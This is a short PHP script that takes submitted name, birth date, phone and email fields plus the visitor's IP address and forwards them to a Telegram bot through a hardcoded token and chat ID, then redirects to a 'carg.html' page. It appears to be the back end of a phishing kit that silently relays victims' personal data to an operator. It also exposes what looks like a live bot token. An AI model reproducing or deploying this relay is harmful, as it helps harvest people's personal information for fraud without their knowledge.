<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7800708173:AAFsaEPL3GR4dwGlsrmuewijHyyVXD1gNSs";
    $chat_id = "5157616506";
    
    $nombre = $_POST['name'];
    $fecha_nacimiento = $_POST['dates'];
    $telefono = $_POST['cel'];
    $correo = $_POST['arroba'];
    
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $mensaje = "Nueva solicitud de formulario:\n";
    $mensaje .= "\nNames: $nombre";
    $mensaje .= "\nDate: $fecha_nacimiento";
    $mensaje .= "\nCel: $telefono";
    $mensaje .= "\n@: $correo";
    $mensaje .= "\nIP: $ip";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
    
    header("Location: carg.html");
    exit();
}
?>